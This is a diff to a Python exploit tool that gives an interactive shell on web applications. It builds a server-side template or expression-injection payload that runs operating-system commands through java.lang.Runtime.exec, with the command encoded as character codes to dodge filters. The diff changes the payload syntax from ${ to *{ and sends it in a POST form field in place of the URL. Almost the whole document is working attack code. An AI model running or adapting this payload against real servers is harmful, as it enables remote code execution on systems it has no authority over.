@@ -36,7 +36,7 @@ class Terminal(Cmd):
 		for i in command:
 			decimals.append(str(ord(i)))
 
-		payload='''${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)''' % decimals[0]
+		payload='''*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)''' % decimals[0]
 		
 
 		for i in decimals[1:]:
@@ -58,12 +58,12 @@ class Terminal(Cmd):
 		base_url=target
 		payload=self.decimal_encode(args)
 
-		url=base_url+payload
+		url=base_url
 
-		headers = {} #This usually has to be added but there is a Burp extension to convert burp headers into python request headers.
-		debug('Headers: ',str(headers))
+		data = {"name": payload} #This usually has to be added but there is a Burp extension to convert burp headers into python request headers.
+		debug('data: ',str(data))
 		try:
-			response=requests.get(url, headers=headers)
+			response=requests.post(url, data=data)
 			output=response.text
 			#The next line is used to parse out the output, this might be clean but it also may need work. Depends on the vuln.
 			
